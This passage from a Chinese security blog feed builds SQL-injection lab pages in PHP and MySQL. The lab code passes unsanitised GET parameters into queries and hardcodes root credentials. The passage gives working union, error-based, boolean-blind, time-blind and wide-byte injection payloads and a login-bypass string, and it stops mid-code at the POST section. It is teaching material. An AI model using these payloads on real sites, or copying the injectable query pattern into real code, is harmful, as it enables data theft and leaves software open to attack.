class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h2><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210314145621481.png" alt="image-20210314145621481"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210314145657377.png" alt="image-20210314145657377"></p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入环境搭建和代码编写</title>
      <link href="posts/33159.html"/>
      <url>posts/33159.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>测试环境：</p><p>Apache2.4</p><p>php7.4</p><p>MySQL8.0.22</p></blockquote><h1 id="PHP-MySQL"><a href="#PHP-MySQL" class="headerlink" title="PHP + MySQL"></a>PHP + MySQL</h1><p>通过PHP 可以操作MySQL中的数据，但首先需要解决的问题是PHP如何连接到MySQL?</p><p>有以下三种方式：</p><ul><li>MySQLi (面向对象)</li><li>MySQLi (面向过程)</li><li>PDO(PHP Data Objects)</li></ul><p>区别在于：PDO 应用在 12 种不同数据库中， MySQLi 只针对 MySQL 数据库。</p><p>MySQLi 和 PDO在PHP安装时大多数情况下是自动安装的，可能需要做的是在PHP配置文件 <code>php.ini</code>中开启相应模块（去掉前面的分号），安装情况可通过<code>phpinfo()</code>进行查看。</p><p>修改<code>php.ini</code></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306205054865.png"></p><p>通过<code>phpinfo()</code> 查看</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306204317682.png"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306204242649.png"></p><p><strong>三种连接方式示例：</strong></p><p>MySQLi (面向对象)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;username&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> mysqli(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;连接成功&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>MySQLi (面向过程)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;username&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;连接成功&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>PDO</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;username&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$conn</span> = <span class="keyword">new</span> PDO(<span class="string">&quot;mysql:host=<span class="subst">$servername</span>;&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;连接成功&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(PDOException <span class="variable">$e</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>以下测试代码使用MySQLi (面向过程)进行连接，部分代码参考于sqlilabs源码。</p><h1 id="回显注入"><a href="#回显注入" class="headerlink" title="回显注入"></a>回显注入</h1><p>回显注入是指我们的查询内容会显示到页面中,造成的原因之一是没有对用户输入的参数进行过滤。</p><p><strong>测试代码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;SQL常规回显注入环境&quot;</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 连接mysql</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断连接是否成功</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line">   <span class="keyword">die</span> (<span class="string">&quot;连接MySQL发生错误:&quot;</span> . mysqli_error(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 选择库 test</span></span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>, <span class="string">&#x27;test&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;无法正确连接到数据库！&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//取消报错显示</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收参数id</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">// 执行sql语句并返回结果</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your username：&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Your password：&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] . <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> mysqli_error(<span class="variable">$conn</span>) . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;执行的SQL语句：&#x27;</span>. <span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>对应页面如下：</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306225550792.png"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306232323655.png"></p><p><strong>注入语句：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?id&#x3D;-1&#39; union select 1,(select database()),(select version())--+</span><br></pre></td></tr></table></figure><p><strong>注入结果：</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306224726475.png"></p><p><strong>防御代码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对输入的参数进行过滤</span></span><br><span class="line"><span class="variable">$id</span>=addslashes(<span class="variable">$id</span>);</span><br></pre></td></tr></table></figure><p><strong>效果：</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307192422989.png" alt="image-20210307192422989"></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>报错注入是指页面不返回内容数据，无法从回显结果获得信息；但是一般都会保留SQL的报错函数<code>mysqli_error()</code> ；通过<code>extractvalue</code> <code>UpdateXml</code> <code>floor</code>等函数构造错误的语句以从报错信息中获得想要的信息。造成的原因之一也是没有对用户输入的参数进行过滤，导致了用户可以输入非预期的内容从而获得敏感的数据，只不过报错注入是利用错误信息回显。</p><p><strong>测试代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;SQL报错注入环境&quot;</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 连接mysql</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断连接是否成功</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line">   <span class="keyword">die</span> (<span class="string">&quot;连接MySQL发生错误:&quot;</span> . mysqli_error(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 选择库 test</span></span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>, <span class="string">&#x27;test&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;无法正确连接到数据库！&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//取消报错显示</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收参数id</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">// 执行sql语句并返回结果</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;You are in ...&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> mysqli_error(<span class="variable">$conn</span>) . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;执行的SQL语句：&#x27;</span>. <span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>对应页面如下：</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306232515661.png"></p><p><strong>注入语句：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?id&#x3D;1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))--+</span><br></pre></td></tr></table></figure><p><strong>注入结果：</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306232739874.png"></p><p><strong>防御措施：</strong></p><p>对输入的参数进行过滤，并取消报错信息显示等。</p><h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p>盲注指无法利用回显和报错信息等情况，进行的一种sql注入方法。</p><p>盲注主要分为两种：</p><ul><li>布尔盲注：通过判断页面响应情况判断是否存在注入点。</li><li>时间盲注：利用页面加载时间来判断后端数据库是否执行了我们构造的sql语句，本质还是没有对用户输入的参数进行处理，导致了用户可以随意闭合，构造自己需要的sql语句。</li></ul><p><strong>测试代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;SQL盲注环境&quot;</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 连接mysql</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断连接是否成功</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line">   <span class="keyword">die</span> (<span class="string">&quot;连接MySQL发生错误:&quot;</span> . mysqli_error(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 选择库 test</span></span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>, <span class="string">&#x27;test&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;无法正确连接到数据库！&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//取消报错显示</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收参数id</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">// 执行sql语句并返回结果</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;You are in ...&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You are not in ...&#x27;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>; <span class="comment">// 布尔盲注</span></span><br><span class="line">         <span class="comment">//echo &#x27;You are in ...&lt;hr&gt;&#x27;; // 时间盲注</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;执行的SQL语句：&#x27;</span>. <span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>布尔盲注对应页面：</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306234906381.png"></p><p>添加单引号后不报错，但页面响应不同</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306234936476.png"></p><p>注入语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?id&#x3D;1&#39; and length(database())&gt;5--+</span><br><span class="line">&#x2F;?id&#x3D;1&#39; and length(database())&gt;3--+</span><br></pre></td></tr></table></figure><p>注入结果：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306235533662.png"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306235615337.png"></p><p>上面结果说明当前数据库名字的长度在3~5之间，以此类推，可得到其他信息。</p><p><strong>时间盲注对应页面：</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307084559117.png"></p><p>添加单引号后不报错，且页面响应相同</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307084635657.png"></p><p>注入语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?id&#x3D;1&#39; and if(1&#x3D;0,1,sleep(5))--+</span><br><span class="line">&#x2F;?id&#x3D;1&#39; and if(length(database())&#x3D;4,sleep(5),1)--+</span><br><span class="line">&#x2F;?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&#x3D;116,sleep(5),1)--+</span><br></pre></td></tr></table></figure><p>注入结果：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307090147625.png"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307090340750.png"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307091305473.png"></p><p><strong>防御措施：</strong></p><p>对输入的参数进行过滤等。</p><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>当mysql数据库采用GBK编码时可能存在宽字节注入。</p><p>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码（GBK就是常说的宽字节之一，实际上只有两字节）的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围），而当我们输入有单引号时会自动加入\进行转义而变为\’（在PHP配置文件中magic_quotes_gpc=On的情况下或者使用addslashes函数，icov函数，mysql_real_escape_string函数、mysql_escape_string函数等，提交的参数中如果带有单引号’，就会被自动转义\’，使得多数注入攻击无效），由于宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，将后面的一个字节与前一个大于128的ascii码进行组合成为一个完整的字符，此时’前的\就被吃了，我们就可以使用’了，利用这个特性从而可实施SQL注入的利用。最常使用的宽字节注入是利用%df，其实我们只要第一个ascii码大于128就可以了，比如ascii码为129的就可以，即为%81。</p><p>参考文章：<a href="https://blog.51cto.com/eth10/1962804">浅谈对宽字节注入的认识</a></p><p><strong>测试代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;SQL宽字节注入环境&quot;</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 连接mysql</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断连接是否成功</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line">   <span class="keyword">die</span> (<span class="string">&quot;连接MySQL发生错误:&quot;</span> . mysqli_error(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 选择库 test</span></span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>, <span class="string">&#x27;test&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;无法正确连接到数据库！&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//取消报错显示</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置GBK编码</span></span><br><span class="line">mysqli_query(<span class="variable">$conn</span>, <span class="string">&#x27;set names gbk&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收参数id</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="comment">// addslashes()函数，在预定义符号前添加反斜杠</span></span><br><span class="line">    <span class="variable">$id</span>=addslashes(<span class="variable">$id</span>);</span><br><span class="line">    <span class="comment">// 执行sql语句并返回结果</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your username：&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Your password：&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] . <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> mysqli_error(<span class="variable">$conn</span>) . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;执行的SQL语句：&#x27;</span>. <span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>对应页面如下：</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307105837231.png"></p><p><strong>注入语句：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?id&#x3D;-1%df&#39; union select 1,(select @@datadir),(select @@version_compile_os)--+</span><br></pre></td></tr></table></figure><p><strong>注入结果：</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307110636955.png"></p><p><strong>防御措施：</strong></p><p>设置MySQL的字符集为 UTF-8。</p><h1 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h1><p>当对以POST方式提交的参数无任何的过滤，直接拼接用户名和密码来从数据库中直接查询结果并实现登录等情况，可直接构造一个sql语句越过密码的确认，也就是俗称的万能密码<code>admin&#39; --+</code>或<code>admin&#39;#</code></p><p><strong>测试代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 